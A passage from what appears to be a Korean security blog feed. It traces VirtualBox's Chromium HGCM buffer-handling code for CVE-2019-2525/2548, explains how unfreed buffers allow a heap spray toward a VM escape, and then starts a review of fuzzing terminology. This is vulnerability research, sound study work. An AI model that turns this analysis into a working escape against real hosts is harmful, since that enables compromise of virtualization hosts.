&#123;</span><br><span class="line">            <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)((<span class="keyword">uintptr_t</span>)pSvcBuffer-&gt;pData+ui32Offset), pBuffer, cbBuffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Return the buffer id */</span></span><br><span class="line">            paParms[<span class="number">0</span>].u.uint32 = pSvcBuffer-&gt;uiId;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>parameter의 개수와 타입 검사를 한 후 세 번째 인자인 [0,sz,0,msg]를 알맞게 파싱해준다. ([bufID, bufSZ,offset,msg])</li><li>bufID와, msg의 크기를 인자로 svcGetBuffer함수를 호출하는데 이때 반환 값은 CRVBOXSVCBUFFER_t 구조체이다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CRVBOXSVCBUFFER_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> uiId;</span><br><span class="line">    <span class="keyword">uint32_t</span> uiSize;</span><br><span class="line">    <span class="keyword">void</span>*    pData;</span><br><span class="line">    _CRVBOXSVCBUFFER_t *pNext, *pPrev;</span><br><span class="line">&#125; CRVBOXSVCBUFFER_t;</span><br></pre></td></tr></table></figure><ul><li>CRVBOXSVCBUFFER_t 구조는 위와 같다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> CRVBOXSVCBUFFER_t* <span class="title">svcGetBuffer</span><span class="params">(<span class="keyword">uint32_t</span> iBuffer, <span class="keyword">uint32_t</span> cbBufferSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CRVBOXSVCBUFFER_t* pBuffer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iBuffer)</span><br><span class="line">    &#123;</span><br><span class="line">        pBuffer = g_pCRVBoxSVCBuffers;</span><br><span class="line">        <span class="keyword">while</span> (pBuffer)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (pBuffer-&gt;uiId == iBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (cbBufferSize &amp;&amp; pBuffer-&gt;uiSize!=cbBufferSize)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">static</span> <span class="keyword">int</span> shown=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (shown&lt;<span class="number">20</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        shown++;</span><br><span class="line">                        LogRel((<span class="string">&quot;OpenGL: svcGetBuffer: Invalid buffer(%i) size %i instead of %i\n&quot;</span>,</span><br><span class="line">                                iBuffer, pBuffer-&gt;uiSize, cbBufferSize));</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> pBuffer;</span><br><span class="line">            &#125;</span><br><span class="line">            pBuffer = pBuffer-&gt;pNext;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>svcGetBuffer함수는 인자로 받은 bufID,Size에 맞는 버퍼가 서버에 존재한다면 해당 주소를 반환한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">else</span> <span class="comment">/*allocate new buffer*/</span></span><br><span class="line">    &#123;</span><br><span class="line">        pBuffer = (CRVBOXSVCBUFFER_t*) RTMemAlloc(<span class="keyword">sizeof</span>(CRVBOXSVCBUFFER_t));</span><br><span class="line">        <span class="keyword">if</span> (pBuffer)</span><br><span class="line">        &#123;</span><br><span class="line">            pBuffer-&gt;pData = RTMemAlloc(cbBufferSize);</span><br><span class="line">            <span class="keyword">if</span> (!pBuffer-&gt;pData)</span><br><span class="line">            &#123;</span><br><span class="line">                LogRel((<span class="string">&quot;OpenGL: svcGetBuffer: Not enough memory (%d)\n&quot;</span>, cbBufferSize));</span><br><span class="line">                RTMemFree(pBuffer);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pBuffer-&gt;uiId = ++g_CRVBoxSVCBufferID;</span><br><span class="line">            <span class="keyword">if</span> (!pBuffer-&gt;uiId)</span><br><span class="line">            &#123;</span><br><span class="line">                pBuffer-&gt;uiId = ++g_CRVBoxSVCBufferID;</span><br><span class="line">            &#125;</span><br><span class="line">            Assert(pBuffer-&gt;uiId);</span><br><span class="line">            pBuffer-&gt;uiSize = cbBufferSize;</span><br><span class="line">            pBuffer-&gt;pPrev = <span class="literal">NULL</span>;</span><br><span class="line">            pBuffer-&gt;pNext = g_pCRVBoxSVCBuffers;</span><br><span class="line">            <span class="keyword">if</span> (g_pCRVBoxSVCBuffers)</span><br><span class="line">            &#123;</span><br><span class="line">                g_pCRVBoxSVCBuffers-&gt;pPrev = pBuffer;</span><br><span class="line">            &#125;</span><br><span class="line">            g_pCRVBoxSVCBuffers = pBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            LogRel((<span class="string">&quot;OpenGL: svcGetBuffer: Not enough memory (%d)\n&quot;</span>, <span class="keyword">sizeof</span>(CRVBOXSVCBUFFER_t)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>그렇지 않다면 새로 버퍼를 할당하고, 할당한 주소를 반환한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">void</span>*)((<span class="keyword">uintptr_t</span>)pSvcBuffer-&gt;pData+ui32Offset), pBuffer, cbBuffer);</span><br></pre></td></tr></table></figure><ul><li>이 후 할당받은 CRVBOXSVCBUFFER_t 구조체 버퍼의 pdata에 인자로 주었던 offset만큼 더한 위치에 msg를 복사한다.</li><li>그림으로 정리하면 아래와 같다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/138871086-e138d173-8737-46f7-a005-e14118d29ac9.png" alt="23"></p><ul><li>hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [id, sz, offset, msg])에서 msg를 pdata+offset에 저장.</li></ul><hr><ul><li>alloc_buf호출 이 후 SHCRGL_GUEST_FN_WRITE_READ_BUFFERED를 인자로 다시 한 번 hgcm_call를 호출한다.</li><li>이 때, 세번째 인자는 [buf, “A”*bufsz, 1337] 이다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> SHCRGL_GUEST_FN_WRITE_READ_BUFFERED:</span><br><span class="line">&#123;</span><br><span class="line">    Log((<span class="string">&quot;svcCall: SHCRGL_GUEST_FN_WRITE_READ_BUFFERED\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Verify parameter count and types. */</span></span><br><span class="line">    <span class="keyword">if</span> (cParms != SHCRGL_CPARMS_WRITE_READ_BUFFERED)</span><br><span class="line">    &#123;</span><br><span class="line">        rc = VERR_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> (    paParms[<span class="number">0</span>].type != VBOX_HGCM_SVC_PARM_32BIT   <span class="comment">/* iBufferID */</span></span><br><span class="line">         || paParms[<span class="number">1</span>].type != VBOX_HGCM_SVC_PARM_PTR     <span class="comment">/* pWriteback */</span></span><br><span class="line">         || paParms[<span class="number">2</span>].type != VBOX_HGCM_SVC_PARM_32BIT   <span class="comment">/* cbWriteback */</span></span><br><span class="line">         || !paParms[<span class="number">0</span>].u.uint32 <span class="comment">/*iBufferID can&#x27;t be 0 here*/</span></span><br><span class="line">       )</span><br><span class="line">    &#123;</span><br><span class="line">        rc = VERR_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Fetch parameters. */</span></span><br><span class="line">        <span class="keyword">uint32_t</span> iBuffer = paParms[<span class="number">0</span>].u.uint32;</span><br><span class="line">        <span class="keyword">uint8_t</span> *pWriteback  = (<span class="keyword">uint8_t</span> *)paParms[<span class="number">1</span>].u.pointer.addr;</span><br><span class="line">        <span class="keyword">uint32_t</span> cbWriteback = paParms[<span class="number">1</span>].u.pointer.size;</span><br><span class="line"></span><br><span class="line">        CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!pSvcBuffer)</span><br><span class="line">        &#123;</span><br><span class="line">            LogRel((<span class="string">&quot;OpenGL: svcCall(WRITE_READ_BUFFERED): Invalid buffer (%d)\n&quot;</span>, iBuffer));</span><br><span class="line">            rc = VERR_INVALID_PARAMETER;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint8_t</span> *pBuffer     = (<span class="keyword">uint8_t</span> *)pSvcBuffer-&gt;pData;</span><br><span class="line">        <span class="keyword">uint32_t</span> cbBuffer    = pSvcBuffer-&gt;uiSize;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Execute the function. */</span></span><br><span class="line">        rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);</span><br><span class="line">        <span class="keyword">if</span> (!RT_SUCCESS(rc))</span><br><span class="line">        &#123;</span><br><span class="line">            Assert(VERR_NOT_SUPPORTED==rc);</span><br><span class="line">            svcClientVersionUnsupported(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        rc = crVBoxServerClientRead(u32ClientID, pWriteback, &amp;cbWriteback);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (RT_SUCCESS(rc))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Update parameters.*/</span></span><br><span class="line">            paParms[<span class="number">1</span>].u.pointer.size = cbWriteback;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Return the required buffer size always */</span></span><br><span class="line">        paParms[<span class="number">2</span>].u.uint32 = cbWriteback;</span><br><span class="line"></span><br><span class="line">        svcFreeBuffer(pSvcBuffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>parameter의 개수와 타입 검사를 한 후 세 번째 인자인 [buf, “A”bufsz, 1337] 를 알맞게 파싱해준다.</li><li>그리고 다시 bufID와, 0을 인자로 svcGetBuffer함수를 호출한다.</li><li>반환된 pSvcBuffer를 통해 변수 pBuffer, cbBuffer를 설정하고 crVBoxServerClientWrite함수를 호출한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">crVBoxServerClientWrite</span><span class="params">(<span class="keyword">uint32_t</span> u32ClientID, <span class="keyword">uint8_t</span> *pBuffer, <span class="keyword">uint32_t</span> cbBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CRClient *pClient=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int32_t</span> rc = crVBoxServerClientGet(u32ClientID, &amp;pClient);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (RT_FAILURE(rc))</span><br><span class="line">        <span class="keyword">return</span> rc;</span><br><span class="line"></span><br><span class="line">    CRASSERT(pBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This should never fire unless we start to multithread */</span></span><br><span class="line">    CRASSERT(pClient-&gt;conn-&gt;pBuffer==<span class="literal">NULL</span> &amp;&amp; pClient-&gt;conn-&gt;cbBuffer==<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pClient-&gt;conn-&gt;pBuffer = pBuffer;</span><br><span class="line">    pClient-&gt;conn-&gt;cbBuffer = cbBuffer;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> VBOX_WITH_CRHGSMI</span></span><br><span class="line">    CRVBOXHGSMI_CMDDATA_ASSERT_CLEANED(&amp;pClient-&gt;conn-&gt;CmdData);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    crVBoxServerInternalClientWriteRead(pClient);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> VINF_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>pClient 변수에 인자 정보를 저장하고 crVBoxServerInternalClientWriteRead 함수를 호출한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">crVBoxServerInternalClientWriteRead</span><span class="params">(CRClient *pClient)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">    crNetRecv();</span><br><span class="line">    CRASSERT(pClient-&gt;conn-&gt;pBuffer==<span class="literal">NULL</span> &amp;&amp; pClient-&gt;conn-&gt;cbBuffer==<span class="number">0</span>);</span><br><span class="line">    CRVBOXHGSMI_CMDDATA_ASSERT_CLEANED(&amp;pClient-&gt;conn-&gt;CmdData);</span><br><span class="line"></span><br><span class="line">    crServerServiceClients();</span><br><span class="line">    crStateResetCurrentPointers(&amp;cr_server.current);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li> crServerServiceClients 함수를 호출한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">crServerServiceClients</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RunQueue *q;</span><br><span class="line"></span><br><span class="line">    q = getNextClient(GL_FALSE); <span class="comment">/* don&#x27;t block */</span></span><br><span class="line">    <span class="keyword">while</span> (q) </span><br><span class="line">    &#123;</span><br><span class="line">        ClientStatus stat = crServerServiceClient(q);</span><br><span class="line">        <span class="keyword">if</span> (stat == CLIENT_NEXT &amp;&amp; cr_server.run_queue-&gt;next) &#123;</span><br><span class="line">            <span class="comment">/* advance to next client */</span></span><br><span class="line">            cr_server.run_queue = cr_server.run_queue-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        q = getNextClient(GL_FALSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>crServerServiceClient 함수를 호출한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ClientStatus</span></span><br><span class="line"><span class="function"><span class="title">crServerServiceClient</span><span class="params">(<span class="keyword">const</span> RunQueue *qEntry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CRMessage *msg;</span><br><span class="line">    CRConnection *conn;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">        <span class="comment">/* Force scissor, viewport and projection matrix update in</span></span><br><span class="line"><span class="comment">         * crServerSetOutputBounds().</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        cr_server.currentSerialNo = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Commands get dispatched here */</span></span><br><span class="line">        crServerDispatchMessage( conn, msg, len );</span><br><span class="line"></span><br><span class="line">        crNetFree( conn, msg );</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>crServerDispatchMessage 함수를 호출한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">crServerDispatchMessage</span><span class="params">(CRConnection *conn, CRMessage *msg, <span class="keyword">int</span> cbMsg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    msg_opcodes = (<span class="keyword">const</span> CRMessageOpcodes *) msg;</span><br><span class="line">    opcodeBytes = (msg_opcodes-&gt;numOpcodes + <span class="number">3</span>) &amp; ~<span class="number">0x03</span>;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    data_ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) msg_opcodes + <span class="keyword">sizeof</span>(CRMessageOpcodes) + opcodeBytes;</span><br><span class="line">    data_ptr_end = (<span class="keyword">const</span> <span class="keyword">char</span> *)msg_opcodes + cbMsg; <span class="comment">// Pointer to the first byte after message data</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fUnpack)</span><br><span class="line">    &#123;</span><br><span class="line">        crUnpack(data_ptr,                 <span class="comment">/* first command&#x27;s operands */</span></span><br><span class="line">                 data_ptr_end,             <span class="comment">/* first byte after command&#x27;s operands*/</span></span><br><span class="line">                 data_ptr - <span class="number">1</span>,             <span class="comment">/* first command&#x27;s opcode */</span></span><br><span class="line">                 msg_opcodes-&gt;numOpcodes,  <span class="comment">/* how many opcodes */</span></span><br><span class="line">                 &amp;(cr_server.dispatch));   <span class="comment">/* the CR dispatch table */</span></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>해당 함수는 msg를 CRMessageOpcodes로 캐스팅 후 crUnpack함수를 호출한다.</li><li>여기서 data_ptr에는 Opcode+data에서 Opcode를 제외한 data의 주소가 들어간다.</li><li>crUnpack 함수에서 Opcode값에 따른 로직을 처리하게 된다.</li><li>crVBoxServerClientWrite 함수 호출 이 후, svcFreeBuffer 함수를 호출하여 할당한 버퍼를 Free 시킨다.</li></ul><p><strong>따라서 alloc_buf에서 할당한 메모리는 crmsg가 호출되기 전까지 Free되지 않으므로 Heap Spray가 가능하다.</strong></p><hr><h3 id="Next-Posting"><a href="#Next-Posting" class="headerlink" title="Next Posting"></a>Next Posting</h3><p><img src="https://user-images.githubusercontent.com/49066484/138879933-fbb0a2b0-de18-42d6-857f-045ac5519d24.png" alt="5"></p><ul><li>CVE-2019-2525 : crUnpackExtendGetAttribLocation</li><li>CVE-2019-2548 : crServerDispatchReadPixels</li><li>각각 함수에서 취약점이 발견되었으며 이 두개를 활용하여 VM Exploit이 가능하다.</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>Virtualization Bug #1 Singi (멘토님 강의자료)</li><li><a href="https://github.com/niklasb/3dpwn">https://github.com/niklasb/3dpwn</a></li><li><a href="https://labs.f-secure.com/assets/BlogFiles/offensivecon-2019-3d-accelerated-exploitation-jason-matthyser.pdf">https://labs.f-secure.com/assets/BlogFiles/offensivecon-2019-3d-accelerated-exploitation-jason-matthyser.pdf</a></li><li><a href="https://wogh8732.tistory.com/273?category=804777">https://wogh8732.tistory.com/273?category=804777</a></li><li><a href="https://cosyp.tistory.com/247">https://cosyp.tistory.com/247</a></li><li><a href="https://1993-constant.tistory.com/590?category=927096">https://1993-constant.tistory.com/590?category=927096</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/1-day/">1-day</category>
      
      <category domain="https://pwnkidhn.github.io/tags/CVE/">CVE</category>
      
      <category domain="https://pwnkidhn.github.io/tags/VM-Escape/">VM Escape</category>
      
      <category domain="https://pwnkidhn.github.io/tags/VirtualBox/">VirtualBox</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/10/25/2021-10-26-CVE-2019-2525_2548_1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Fuzzing Art, Science, and Engineering Review</title>
      <link>https://pwnkidhn.github.io/2021/10/25/2021-10-26-FuzzingART/</link>
      <guid>https://pwnkidhn.github.io/2021/10/25/2021-10-26-FuzzingART/</guid>
      <pubDate>Mon, 25 Oct 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;0-용어-정리&quot;&gt;&lt;a href=&quot;#0-용어-정리&quot; class=&quot;headerlink&quot; title=&quot;0. 용어 정리&quot;&gt;&lt;/a&gt;0. 용어 정리&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;최초 Fuzz는 “대상 프로그램에서 사용할 임의의 문자 스트림을 생성하는 것”을 지칭하는 뜻.&lt;/li&gt;
&lt;li&gt;따라서 Fuzzing은 “PUT(Program Under Test)에 Fuzz 된 입력 값을 넣고 실행하는 행위”&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;0-1-Fuzzing&quot;&gt;&lt;a href=&quot;#0-1-Fuzzing&quot; class=&quot;headerlink&quot; title=&quot;0-1. Fuzzing&quot;&gt;&lt;/a&gt;0-1. Fuzzing&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Definition 2.1 (Fuzzing).&lt;br&gt;Fuzzing is the execution of PUT using input(s) sampled from an input space (the&lt;br&gt;“fuzz input space”) that protrudes the expected input space of the PUT&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;퍼징(Fuzzing)은 PUT의 예상 입력 공간을 벗어나는 입력 공간 (이를 “퍼즈 입력 공간”이라 한다)에서 추출한 입력을 사용하여 PUT에 대해 실행하는 것이다.&lt;/li&gt;
&lt;li&gt;즉, 예상되는 데이터 입력을 벗어나는 값을 사용하여 실행하는 행위&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="0-용어-정리"><a href="#0-용어-정리" class="headerlink" title="0. 용어 정리"></a>0. 용어 정리</h2><ul><li>최초 Fuzz는 “대상 프로그램에서 사용할 임의의 문자 스트림을 생성하는 것”을 지칭하는 뜻.</li><li>따라서 Fuzzing은 “PUT(Program Under Test)에 Fuzz 된 입력 값을 넣고 실행하는 행위”</li></ul><h3 id="0-1-Fuzzing"><a href="#0-1-Fuzzing" class="headerlink" title="0-1. Fuzzing"></a>0-1. Fuzzing</h3><blockquote><p>Definition 2.1 (Fuzzing).<br>Fuzzing is the execution of PUT using input(s) sampled from an input space (the<br>“fuzz input space”) that protrudes the expected input space of the PUT</p></blockquote><ul><li>퍼징(Fuzzing)은 PUT의 예상 입력 공간을 벗어나는 입력 공간 (이를 “퍼즈 입력 공간”이라 한다)에서 추출한 입력을 사용하여 PUT에 대해 실행하는 것이다.</li><li>즉, 예상되는 데이터 입력을 벗어나는 값을 사용하여 실행하는 행위</li></ul><span id="more"></span><h3 id="0-2-Fuzz-Testing"><a href="#0-2-Fuzz-Testing" class="headerlink" title="0-2. Fuzz Testing"></a>0-2. Fuzz Testing</h3><blockquote><p>Definition 2.2 (Fuzz Testing).<br>Fuzz testing is the use of fuzzing where the goal is to test a PUT against a security policy.</p></blockquote><ul><li>퍼즈테스팅은 “대상 프로그램이 보안 정책을 준수하는지 여부를 퍼징을 통해 점검하<br>는 것”으로 정의할 수 있다.</li></ul><h3 id="0-3-Fuzzer"><a href="#0-3-Fuzzer" class="headerlink" title="0-3. Fuzzer"></a>0-3. Fuzzer</h3><blockquote><p>Definition 2.3 (Fuzzer).<br>A fuzzer is a program that performs fuzz testing on a PUT.</p></blockquote><ul><li>퍼저는 대상 프로그램에 퍼즈 테스팅을 수행하는 프로그램이다.</li></ul><h3 id="0-4-Fuzz-Campaign"><a href="#0-4-Fuzz-Campaign" class="headerlink" title="0-4. Fuzz Campaign"></a>0-4. Fuzz Campaign</h3><blockquote><p>Definition 2.4 (Fuzz Campaign).<br>A fuzz campaign is a specific execution of a fuzzer on a PUT with a specific security policy.</p></blockquote><ul><li>퍼즈 캠페인은 특정 보안 정책에 대해 특정 데이터를 넣는 실행이다.<ul><li>요구되는 특정 보안 정책을 위반하는 버그를 찾아 내기 위함이다.</li></ul></li></ul><h3 id="0-5-Bug-Oracle-Crash-Monitor"><a href="#0-5-Bug-Oracle-Crash-Monitor" class="headerlink" title="0-5. Bug Oracle (Crash Monitor)"></a>0-5. Bug Oracle (Crash Monitor)</h3><blockquote><p>Definition 2.5 (Bug Oracle).<br>A bug oracle is a program, perhaps as part of a fuzzer, that determines whether a given execution of the PUT violates a specific security policy.</p></blockquote><ul><li>버그 오라클은 대상 프로그램이 주어진 실행에서 특정 보안 정책을 위반하는지를 판<br>별하는 프로그램으로, 퍼저의 일부분으로 포함되어 있다.</li></ul><h3 